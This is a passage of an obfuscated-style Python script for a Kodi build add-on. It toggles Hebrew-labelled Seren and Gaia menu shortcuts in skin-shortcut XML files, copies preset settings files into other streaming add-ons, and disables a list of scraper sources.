		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:595
    with open (OOOOO000O00O0O0OO ,'w')as OO0O0OO0O00O0O000 :#line:598
      OO0O0OO0O00O0O000 .write (OO0O0OOO0O0O0OO0O )#line:599
    OOOOO000O00O0O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:602
    with open (OOOOO000O00O0O0OO ,'r')as OO0O0OO0O00O0O000 :#line:603
      OO0O0OOO0O0O0OO0O =OO0O0OO0O00O0O000 .read ()#line:604
    OO0O0OOO0O0O0OO0O =OO0O0OOO0O0O0OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:622
    with open (OOOOO000O00O0O0OO ,'w')as OO0O0OO0O00O0O000 :#line:625
      OO0O0OO0O00O0O000 .write (OO0O0OOO0O0O0OO0O )#line:626
def rdbuildinstall ():#line:629
  try :#line:630
   O00OO0OOO0OOOOO00 =(ADDON .getSetting ("rdbuild"))#line:631
   if O00OO0OOO0OOOOO00 =='true':#line:632
     OO0O0OO0O0O0O000O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:633
     O00O0OOO000OO000O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:634
     copyfile (OO0O0OO0O0O0O000O ,O00O0OOO000OO000O )#line:635
  except :#line:636
     pass #line:637
def rdbuildaddonoff ():#line:640
    OO0O00OO0OOO0000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:643
    with open (OO0O00OO0OOO0000O ,'r')as OOO0OO000O00000OO :#line:644
      OO0OO0O000OO00OOO =OOO0OO000O00000OO .read ()#line:645
    OO0OO0O000OO00OOO =OO0OO0O000OO00OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:663
    with open (OO0O00OO0OOO0000O ,'w')as OOO0OO000O00000OO :#line:666
      OOO0OO000O00000OO .write (OO0OO0O000OO00OOO )#line:667
    OO0O00OO0OOO0000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:671
    with open (OO0O00OO0OOO0000O ,'r')as OOO0OO000O00000OO :#line:672
      OO0OO0O000OO00OOO =OOO0OO000O00000OO .read ()#line:673
    OO0OO0O000OO00OOO =OO0OO0O000OO00OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:691
    with open (OO0O00OO0OOO0000O ,'w')as OOO0OO000O00000OO :#line:694
      OOO0OO000O00000OO .write (OO0OO0O000OO00OOO )#line:695
    OO0O00OO0OOO0000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:699
    with open (OO0O00OO0OOO0000O ,'r')as OOO0OO000O00000OO :#line:700
      OO0OO0O000OO00OOO =OOO0OO000O00000OO .read ()#line:701
    OO0OO0O000OO00OOO =OO0OO0O000OO00OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:719
    with open (OO0O00OO0OOO0000O ,'w')as OOO0OO000O00000OO :#line:722
      OOO0OO000O00000OO .write (OO0OO0O000OO00OOO )#line:723
    OO0O00OO0OOO0000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:727
    with open (OO0O00OO0OOO0000O ,'r')as OOO0OO000O00000OO :#line:728
      OO0OO0O000OO00OOO =OOO0OO000O00000OO .read ()#line:729
    OO0OO0O000OO00OOO =OO0OO0O000OO00OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:747
    with open (OO0O00OO0OOO0000O ,'w')as OOO0OO000O00000OO :#line:750
      OOO0OO000O00000OO .write (OO0OO0O000OO00OOO )#line:751
    OO0O00OO0OOO0000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:754
    with open (OO0O00OO0OOO0000O ,'r')as OOO0OO000O00000OO :#line:755
      OO0OO0O000OO00OOO =OOO0OO000O00000OO .read ()#line:756
    OO0OO0O000OO00OOO =OO0OO0O000OO00OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:774
    with open (OO0O00OO0OOO0000O ,'w')as OOO0OO000O00000OO :#line:777
      OOO0OO000O00000OO .write (OO0OO0O000OO00OOO )#line:778
    OO0O00OO0OOO0000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:780
    with open (OO0O00OO0OOO0000O ,'r')as OOO0OO000O00000OO :#line:781
      OO0OO0O000OO00OOO =OOO0OO000O00000OO .read ()#line:782
    OO0OO0O000OO00OOO =OO0OO0O000OO00OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:800
    with open (OO0O00OO0OOO0000O ,'w')as OOO0OO000O00000OO :#line:803
      OOO0OO000O00000OO .write (OO0OO0O000OO00OOO )#line:804
    OO0O00OO0OOO0000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:806
    with open (OO0O00OO0OOO0000O ,'r')as OOO0OO000O00000OO :#line:807
      OO0OO0O000OO00OOO =OOO0OO000O00000OO .read ()#line:808
    OO0OO0O000OO00OOO =OO0OO0O000OO00OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:826
    with open (OO0O00OO0OOO0000O ,'w')as OOO0OO000O00000OO :#line:829
      OOO0OO000O00000OO .write (OO0OO0O000OO00OOO )#line:830
    OO0O00OO0OOO0000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:833
    with open (OO0O00OO0OOO0000O ,'r')as OOO0OO000O00000OO :#line:834
      OO0OO0O000OO00OOO =OOO0OO000O00000OO .read ()#line:835
    OO0OO0O000OO00OOO =OO0OO0O000OO00OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:853
    with open (OO0O00OO0OOO0000O ,'w')as OOO0OO000O00000OO :#line:856
      OOO0OO000O00000OO .write (OO0OO0O000OO00OOO )#line:857
def rdbuildinstalloff ():#line:860
    try :#line:861
       O000000000O0O000O =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:862
       OOOOO000000OO0OO0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:863
       copyfile (O000000000O0O000O ,OOOOO000000OO0OO0 )#line:865
       O000000000O0O000O =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:867
       OOOOO000000OO0OO0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:868
       copyfile (O000000000O0O000O ,OOOOO000000OO0OO0 )#line:870
       O000000000O0O000O =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:872
       OOOOO000000OO0OO0 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:873
       copyfile (O000000000O0O000O ,OOOOO000000OO0OO0 )#line:875
       O000000000O0O000O =ADDONPATH +"/resources/rdoff/Splash.png"#line:878
       OOOOO000000OO0OO0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:879
       copyfile (O000000000O0O000O ,OOOOO000000OO0OO0 )#line:881
    except :#line:883
       pass #line:884
def rdbuildaddonON ():#line:891
    OOOOOO0O000OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:893
    with open (OOOOOO0O000OOOO0O ,'r')as O00O000000O0000O0 :#line:894
      OOOO00O0OO0OO0OOO =O00O000000O0000O0 .read ()#line:895
    OOOO00O0OO0OO0OOO =OOOO00O0OO0OO0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:913
    with open (OOOOOO0O000OOOO0O ,'w')as O00O000000O0000O0 :#line:916
      O00O000000O0000O0 .write (OOOO00O0OO0OO0OOO )#line:917
    OOOOOO0O000OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:921
    with open (OOOOOO0O000OOOO0O ,'r')as O00O000000O0000O0 :#line:922
      OOOO00O0OO0OO0OOO =O00O000000O0000O0 .read ()#line:923
    OOOO00O0OO0OO0OOO =OOOO00O0OO0OO0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:941
    with open (OOOOOO0O000OOOO0O ,'w')as O00O000000O0000O0 :#line:944
      O00O000000O0000O0 .write (OOOO00O0OO0OO0OOO )#line:945
    OOOOOO0O000OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:949
    with open (OOOOOO0O000OOOO0O ,'r')as O00O000000O0000O0 :#line:950
      OOOO00O0OO0OO0OOO =O00O000000O0000O0 .read ()#line:951
    OOOO00O0OO0OO0OOO =OOOO00O0OO0OO0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:969
    with open (OOOOOO0O000OOOO0O ,'w')as O00O000000O0000O0 :#line:972
      O00O000000O0000O0 .write (OOOO00O0OO0OO0OOO )#line:973
    OOOOOO0O000OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:977
    with open (OOOOOO0O000OOOO0O ,'r')as O00O000000O0000O0 :#line:978
      OOOO00O0OO0OO0OOO =O00O000000O0000O0 .read ()#line:979
    OOOO00O0OO0OO0OOO =OOOO00O0OO0OO0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:997
    with open (OOOOOO0O000OOOO0O ,'w')as O00O000000O0000O0 :#line:1000
      O00O000000O0000O0 .write (OOOO00O0OO0OO0OOO )#line:1001
    OOOOOO0O000OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1004
    with open (OOOOOO0O000OOOO0O ,'r')as O00O000000O0000O0 :#line:1005
      OOOO00O0OO0OO0OOO =O00O000000O0000O0 .read ()#line:1006
    OOOO00O0OO0OO0OOO =OOOO00O0OO0OO0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1024
    with open (OOOOOO0O000OOOO0O ,'w')as O00O000000O0000O0 :#line:1027
      O00O000000O0000O0 .write (OOOO00O0OO0OO0OOO )#line:1028
    OOOOOO0O000OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1030
    with open (OOOOOO0O000OOOO0O ,'r')as O00O000000O0000O0 :#line:1031
      OOOO00O0OO0OO0OOO =O00O000000O0000O0 .read ()#line:1032
    OOOO00O0OO0OO0OOO =OOOO00O0OO0OO0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1050
    with open (OOOOOO0O000OOOO0O ,'w')as O00O000000O0000O0 :#line:1053
      O00O000000O0000O0 .write (OOOO00O0OO0OO0OOO )#line:1054
    OOOOOO0O000OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1056
    with open (OOOOOO0O000OOOO0O ,'r')as O00O000000O0000O0 :#line:1057
      OOOO00O0OO0OO0OOO =O00O000000O0000O0 .read ()#line:1058
    OOOO00O0OO0OO0OOO =OOOO00O0OO0OO0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1076
    with open (OOOOOO0O000OOOO0O ,'w')as O00O000000O0000O0 :#line:1079
      O00O000000O0000O0 .write (OOOO00O0OO0OO0OOO )#line:1080
    OOOOOO0O000OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1083
    with open (OOOOOO0O000OOOO0O ,'r')as O00O000000O0000O0 :#line:1084
      OOOO00O0OO0OO0OOO =O00O000000O0000O0 .read ()#line:1085
    OOOO00O0OO0OO0OOO =OOOO00O0OO0OO0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1103
    with open (OOOOOO0O000OOOO0O ,'w')as O00O000000O0000O0 :#line:1106
      O00O000000O0000O0 .write (OOOO00O0OO0OO0OOO )#line:1107
def rdbuildinstallON ():#line:1110
    try :#line:1112
       OO00000000O00O00O =ADDONPATH +"/resources/rd/victory.xml"#line:1113
       OO0000O0000OOO00O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1114
       copyfile (OO00000000O00O00O ,OO0000O0000OOO00O )#line:1116
       OO00000000O00O00O =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1118
       OO0000O0000OOO00O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1119
       copyfile (OO00000000O00O00O ,OO0000O0000OOO00O )#line:1121
       OO00000000O00O00O =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1123
       OO0000O0000OOO00O =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1124
       copyfile (OO00000000O00O00O ,OO0000O0000OOO00O )#line:1126
       OO00000000O00O00O =ADDONPATH +"/resources/rd/Splash.png"#line:1129
       OO0000O0000OOO00O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1130
       copyfile (OO00000000O00O00O ,OO0000O0000OOO00O )#line:1132
    except :#line:1134
       pass #line:1135
def rdbuild ():#line:1145
	OOO0O00O000O0OO00 =(ADDON .getSetting ("rdbuild"))#line:1146
	if OOO0O00O000O0OO00 =='true':#line:1147
		OO00OO0O00OOOO0OO =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1148
		OO00OO0O00OOOO0OO .setSetting ('all_t','0')#line:1149
		OO00OO0O00OOOO0OO .setSetting ('rd_menu_enable','false')#line:1150
		OO00OO0O00OOOO0OO .setSetting ('magnet_bay','false')#line:1151
		OO00OO0O00OOOO0OO .setSetting ('magnet_extra','false')#line:1152
		OO00OO0O00OOOO0OO .setSetting ('rd_only','false')#line:1153
		OO00OO0O00OOOO0OO .setSetting ('ftp','false')#line:1155
		OO00OO0O00OOOO0OO .setSetting ('fp','false')#line:1156
		OO00OO0O00OOOO0OO .setSetting ('filter_fp','false')#line:1157
		OO00OO0O00OOOO0OO .setSetting ('fp_size_en','false')#line:1158
		OO00OO0O00OOOO0OO .setSetting ('afdah','false')#line:1159
		OO00OO0O00OOOO0OO .setSetting ('ap2s','false')#line:1160
		OO00OO0O00OOOO0OO .setSetting ('cin','false')#line:1161
		OO00OO0O00OOOO0OO .setSetting ('clv','false')#line:1162
		OO00OO0O00OOOO0OO .setSetting ('cmv','false')#line:1163
		OO00OO0O00OOOO0OO .setSetting ('dl20','false')#line:1164
		OO00OO0O00OOOO0OO .setSetting ('esc','false')#line:1165
		OO00OO0O00OOOO0OO .setSetting ('extra','false')#line:1166
		OO00OO0O00OOOO0OO .setSetting ('film','false')#line:1167
		OO00OO0O00OOOO0OO .setSetting ('fre','false')#line:1168
		OO00OO0O00OOOO0OO .setSetting ('fxy','false')#line:1169
		OO00OO0O00OOOO0OO .setSetting ('genv','false')#line:1170
		OO00OO0O00OOOO0OO .setSetting ('getgo','false')#line:1171
		OO00OO0O00OOOO0OO .setSetting ('gold','false')#line:1172
		OO00OO0O00OOOO0OO .setSetting ('gona','false')#line:1173
		OO00OO0O00OOOO0OO .setSetting ('hdmm','false')#line:1174
		OO00OO0O00OOOO0OO .setSetting ('hdt','false')#line:1175
		OO00OO0O00OOOO0OO .setSetting ('icy','false')#line:1176
		OO00OO0O00OOOO0OO .setSetting ('ind','false')#line:1177
		OO00OO0O00OOOO0OO .setSetting ('iwi','false')#line:1178
		OO00OO0O00OOOO0OO .setSetting ('jen_free','false')#line:1179
		OO00OO0O00OOOO0OO .setSetting ('kiss','false')#line:1180
		OO00OO0O00OOOO0OO .setSetting ('lavin','false')#line:1181
		OO00OO0O00OOOO0OO .setSetting ('los','false')#line:1182
		OO00OO0O00OOOO0OO .setSetting ('m4u','false')#line:1183
		OO00OO0O00OOOO0OO .setSetting ('mesh','false')#line:1184
		OO00OO0O00OOOO0OO .setSetting ('mf','false')#line:1185
		OO00OO0O00OOOO0OO .setSetting ('mkvc','false')#line:1186
		OO00OO0O00OOOO0OO .setSetting ('mjy','false')#line:1187
		OO00OO0O00OOOO0OO .setSetting ('hdonline','false')#line:1188
		OO00OO0O00OOOO0OO .setSetting ('moviex','false')#line:1189
		OO00OO0O00OOOO0OO .setSetting ('mpr','false')#line:1190
		OO00OO0O00OOOO0OO .setSetting ('mvg','false')#line:1191
		OO00OO0O00OOOO0OO .setSetting ('mvl','false')#line:1192
		OO00OO0O00OOOO0OO .setSetting ('mvs','false')#line:1193
		OO00OO0O00OOOO0OO .setSetting ('myeg','false')#line:1194
		OO00OO0O00OOOO0OO .setSetting ('ninja','false')#line:1195
		OO00OO0O00OOOO0OO .setSetting ('odb','false')#line:1196
		OO00OO0O00OOOO0OO .setSetting ('ophd','false')#line:1197
		OO00OO0O00OOOO0OO .setSetting ('pks','false')#line:1198
		OO00OO0O00OOOO0OO .setSetting ('prf','false')#line:1199
		OO00OO0O00OOOO0OO .setSetting ('put18','false')#line:1200
		OO00OO0O00OOOO0OO .setSetting ('req','false')#line:1201
		OO00OO0O00OOOO0OO .setSetting ('rftv','false')#line:1202
		OO00OO0O00OOOO0OO .setSetting ('rltv','false')#line:1203
		OO00OO0O00OOOO0OO .setSetting ('sc','false')#line:1204
		OO00OO0O00OOOO0OO .setSetting ('seehd','false')#line:1205
		OO00OO0O00OOOO0OO .setSetting ('showbox','false')#line:1206
		OO00OO0O00OOOO0OO .setSetting ('shuid','false')#line:1207
		OO00OO0O00OOOO0OO .setSetting ('sil_gh','false')#line:1208
		OO00OO0O00OOOO0OO .setSetting ('spv','false')#line:1209
		OO00OO0O00OOOO0OO .setSetting ('subs','false')#line:1210
		OO00OO0O00OOOO0OO .setSetting ('tvs','false')#line:1211
		OO00OO0O00OOOO0OO .setSetting ('tw','false')#line:1212
		OO00OO0O00OOOO0OO .setSetting ('upto','false')#line:1213
		OO00OO0O00OOOO0OO .setSetting ('vel','false')#line:1214
		OO00OO0O00OOOO0OO .setSetting ('vex','false')#line:1215
		OO00OO0O00OOOO0OO .setSetting ('vidc','false')#line:1216
		OO00OO0O00OOOO0OO .setSetting ('w4hd','false')#line:1217
		OO00OO0O00OOOO0OO .setSetting ('wav','false')#line:1218
		OO00OO0O00OOOO0OO .setSetting ('wf','false')#line:1219
